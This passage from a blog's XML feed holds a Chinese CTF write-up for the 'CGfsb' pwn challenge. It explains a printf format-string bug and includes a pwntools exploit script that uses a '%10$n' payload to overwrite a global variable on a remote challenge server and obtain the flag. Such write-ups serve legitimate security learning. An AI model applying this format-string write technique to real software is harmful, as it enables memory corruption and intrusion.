    <summary type="html">楚慧杯初赛的一道 Mobile 安卓逆向，考察更换码表的 Base64</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-CGfsb</title>
    <link href="https://www.4ss1du0us.cn/2023/033f89f9fd.html"/>
    <id>https://www.4ss1du0us.cn/2023/033f89f9fd.html</id>
    <published>2023-03-20T09:52:37.000Z</published>
    <updated>2023-05-11T05:25:42.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>利用格式化字符串漏洞修改段上的值</li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/e41a0f684d0e497f87bb309f91737e4d">攻防世界-CGfsb</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/WtkIo9w83DB1LQR.png" alt="攻防世界-CGfsb1.png"><br>32位 小端序，开启了金丝雀、栈不可执行</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/uAjlTFJqNCe7iLE.png" alt="攻防世界-CGfsb2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/7Cg5RUcKswLP1jF.png" alt="攻防世界-CGfsb3.png"><br>在 <code>printf(s)</code> 处存在格式化字符串漏洞，当 <code>pwnme == 8</code> 时 cat flag，跟进 <code>pwnme</code>：<br><img src="https://s2.loli.net/2023/05/10/eLI48bvrZ59UkAz.png" alt="攻防世界-CGfsb4.png"><br><code>pwnme</code> 位于 bss 段上<br><code>buf</code> 可写入的大小为 0xA，跟进 <code>buf</code>：<br><img src="https://s2.loli.net/2023/05/10/UH1E2BprqyVox3A.png" alt="攻防世界-CGfsb5.png"><br>长度不够溢出<br>因此本题关键在于利用输入的 <code>s</code> 构造 <code>printf(s)</code> 的格式化字符串漏洞</p></li><li><p>要利用输入修改 <code>pwnme</code> 的值，首先得知道输入进去的数据存在栈上的哪个位置，然后才能将这个位置和 <code>pwnme</code> 的地址对应起来<br>获取输入数据在栈中的偏移量：</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2023/05/10/galWhjic87pntMr.png" alt="攻防世界-CGfsb6.png"></p><ol start="5"><li><p>可以看到，构造 <code>AAAA_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code> 作为参数传入 printf()<br><code>AAAA</code> 的值 <code>0x41414141</code> 出现在输出的第十个地址<br>因此我们的输入在栈上的偏移量为 10</p></li><li><p>由于没有开启 PIE，在 IDA 中可获得 <code>pwnme</code> 的地址：<code>0x0804A068</code><br>接下来直接写脚本即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>pwnme_addr <span class="token operator">=</span> <span class="token number">0x0804A068</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CGfsb/CGfsb"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">54712</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''    # 用于获取输入的数据在栈上的偏移量    io.recvuntil("please tell me your name:\n")    io.sendline("1")    io.recvuntil("leave your message please:\n")    io.sendline("AAAA_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p")    '''</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span><span class="token punctuation">)</span>    <span class="token comment"># %10$n 是将 %n 之前打印的字符的数量放入指定地址内</span>    <span class="token comment"># 而pwnme 需要等于 8，p32(0x0804A068) 打包后是 4 个字节</span>    <span class="token comment"># 所以还需要填充 4 个字节的垃圾数据，凑成打印 8 个字节</span>    <span class="token comment"># 指定的地址是偏移量为 10 的栈空间所指向的地址空间</span>    <span class="token comment"># 所以 pwnme 所在的空间内容就被更改为之前所输出的字符数量 8</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{625aab77a3d7f4bbf120abf06c722ddb}</p></blockquote><p><img src="https://s2.loli.net/2023/05/10/CaE2jFvtuTgmpbA.png" alt="攻防世界-CGfsb7.png"></p>]]></content>
    
    
    <summary type="html">比较经典的格式化字符串漏洞，修改段上的数据</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
</feed>
